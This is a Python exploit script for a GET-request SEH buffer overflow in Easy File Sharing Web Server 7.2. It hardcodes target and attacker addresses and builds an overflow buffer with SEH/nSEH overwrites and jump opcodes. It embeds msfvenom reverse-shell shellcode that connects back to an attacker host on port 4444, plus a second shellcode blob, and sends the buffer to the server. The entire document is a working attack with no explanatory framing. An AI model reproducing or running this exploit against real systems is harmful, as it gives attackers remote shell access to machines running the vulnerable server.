'''exploit : Easy File Sharing Web Server 7.2 GET buffer overflow
Exploit Creation creds : Goutham ( @barriersec.com)
tested on : windows xp sp3 (x86)
'''
import socket
import sys

host = "192.168.0.101"
port = 80

con = socket.socket()

#pop pop ret 10017743
seh = "\x43\x77\x01\x10"

# negative jump 16 bytes
nseh = "\xEB\xEE\x90\x90"

#far negative jump 768 bytes
farjump = "\xE9\xFB\xFC\xFF\xFF"


#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00\x20\x2f\x5c\x25\x2b" -f c
#351 bytes

payload = ("\xda\xce\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52\xba\x04\x84\x6b"
"\xfa\x31\x53\x17\x83\xeb\xfc\x03\x57\x97\x89\x0f\xab\x7f\xcf"
"\xf0\x53\x80\xb0\x79\xb6\xb1\xf0\x1e\xb3\xe2\xc0\x55\x91\x0e"
"\xaa\x38\x01\x84\xde\x94\x26\x2d\x54\xc3\x09\xae\xc5\x37\x08"
"\x2c\x14\x64\xea\x0d\xd7\x79\xeb\x4a\x0a\x73\xb9\x03\x40\x26"
"\x2d\x27\x1c\xfb\xc6\x7b\xb0\x7b\x3b\xcb\xb3\xaa\xea\x47\xea"
"\x6c\x0d\x8b\x86\x24\x15\xc8\xa3\xff\xae\x3a\x5f\xfe\x66\x73"
"\xa0\xad\x47\xbb\x53\xaf\x80\x7c\x8c\xda\xf8\x7e\x31\xdd\x3f"
"\xfc\xed\x68\xdb\xa6\x66\xca\x07\x56\xaa\x8d\xcc\x54\x07\xd9"
"\x8a\x78\x96\x0e\xa1\x85\x13\xb1\x65\x0c\x67\x96\xa1\x54\x33"
"\xb7\xf0\x30\x92\xc8\xe2\x9a\x4b\x6d\x69\x36\x9f\x1c\x30\x5f"
"\x6c\x2d\xca\x9f\xfa\x26\xb9\xad\xa5\x9c\x55\x9e\x2e\x3b\xa2"
"\xe1\x04\xfb\x3c\x1c\xa7\xfc\x15\xdb\xf3\xac\x0d\xca\x7b\x27"
"\xcd\xf3\xa9\xe8\x9d\x5b\x02\x49\x4d\x1c\xf2\x21\x87\x93\x2d"
"\x51\xa8\x79\x46\xf8\x53\xea\xa9\x55\x5b\x82\x41\xa4\x5b\x43"
"\xce\x21\xbd\x09\xfe\x67\x16\xa6\x67\x22\xec\x57\x67\xf8\x89"
"\x58\xe3\x0f\x6e\x16\x04\x65\x7c\xcf\xe4\x30\xde\x46\xfa\xee"
"\x76\x04\x69\x75\x86\x43\x92\x22\xd1\x04\x64\x3b\xb7\xb8\xdf"
"\x95\xa5\x40\xb9\xde\x6d\x9f\x7a\xe0\x6c\x52\xc6\xc6\x7e\xaa"
"\xc7\x42\x2a\x62\x9e\x1c\x84\xc4\x48\xef\x7e\x9f\x27\xb9\x16"
"\x66\x04\x7a\x60\x67\x41\x0c\x8c\xd6\x3c\x49\xb3\xd7\xa8\x5d"
"\xcc\x05\x49\xa1\x07\x8e\x69\x40\x8d\xfb\x01\xdd\x44\x46\x4c"
"\xde\xb3\x85\x69\x5d\x31\x76\x8e\x7d\x30\x73\xca\x39\xa9\x09"
"\x43\xac\xcd\xbe\x64\xe5")

shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)

try:
	con.connect((host,port))
except:
	print "could not connect to the host"



crash = "A"*3270+"\xCC"*7 +"\x90"*27 +payload+"\x90"*390+farjump+"\x90"*11+nseh+seh+"C"*10 + "C"*(5000-4069-10)

#sending exploit
con.send("GET " + crash + " HTTP/1.0\r\n\r\n")
con.close()
